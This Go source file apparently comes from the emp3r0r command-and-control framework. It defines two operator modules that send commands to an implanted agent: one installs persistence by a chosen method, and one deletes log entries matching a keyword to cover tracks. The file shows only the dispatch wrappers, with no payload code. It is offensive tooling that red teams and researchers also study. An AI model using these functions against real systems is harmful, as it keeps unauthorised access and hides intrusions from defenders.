package modules

import (
	"fmt"

	"github.com/jm33-m0/emp3r0r/core/lib/cc/agent_util"
	"github.com/jm33-m0/emp3r0r/core/lib/cc/def"
	emp3r0r_def "github.com/jm33-m0/emp3r0r/core/lib/emp3r0r_def"
	"github.com/jm33-m0/emp3r0r/core/lib/logging"
)

func modulePersistence() {
	methodOpt, ok := AvailableModuleOptions["method"]
	if !ok {
		logging.Errorf("Option 'method' not found")
		return
	}
	cmd := fmt.Sprintf("%s --method %s", emp3r0r_def.C2CmdPersistence, methodOpt.Val)
	err := agent_util.SendCmd(cmd, "", def.ActiveAgent)
	if err != nil {
		logging.Errorf("SendCmd: %v", err)
		return
	}
}

func moduleLogCleaner() {
	keywordOpt, ok := AvailableModuleOptions["keyword"]
	if !ok {
		logging.Errorf("Option 'keyword' not found")
		return
	}
	cmd := fmt.Sprintf("%s --keyword %s", emp3r0r_def.C2CmdCleanLog, keywordOpt.Val)
	err := agent_util.SendCmd(cmd, "", def.ActiveAgent)
	if err != nil {
		logging.Errorf("SendCmd: %v", err)
		return
	}
}
